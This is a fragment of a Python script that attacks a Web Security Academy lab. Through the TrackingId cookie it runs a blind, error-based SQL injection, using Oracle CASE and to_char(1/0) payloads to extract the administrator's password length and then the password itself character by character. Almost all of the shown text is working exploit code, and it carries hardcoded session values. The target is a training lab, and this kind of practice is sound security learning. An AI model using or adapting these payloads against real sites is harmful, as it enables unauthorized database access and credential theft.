...
main_url = 'https://0adb0083037f358a80baad020022003f.web-security-academy.net/';
cookieini = "kNai580U0O8ItKS6";
session = "HTlLeiDVbjuVM4sirfLbmfoA9m3s5rpj";
cookies = {
    'TrackingId': "",
    'session': session
}
...
def makeRq():
    ...
    for position in range(1,l):
        for character in characters:
            cookies['TrackingId'] = "%s'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username='administrator')||'" % (cookieini,position,character)
            ps.status(cookies['TrackingId']);
            r = requests.get(main_url,cookies=cookies);
            #compara los valores de los caracteres en la contraseña
            if r.status_code == verifyText:
                password += character;
                p2.status(password);
                break
...
def compareMinor(value):
    cookies['TrackingId'] = "%s'||(select case when 1=1 then to_char(1/0) else '' end from users where username='administrator' and length(password)>%d)||'" % (cookieini,value)
    r = requests.get(main_url,cookies=cookies)
    return r.status_code == verifyText;
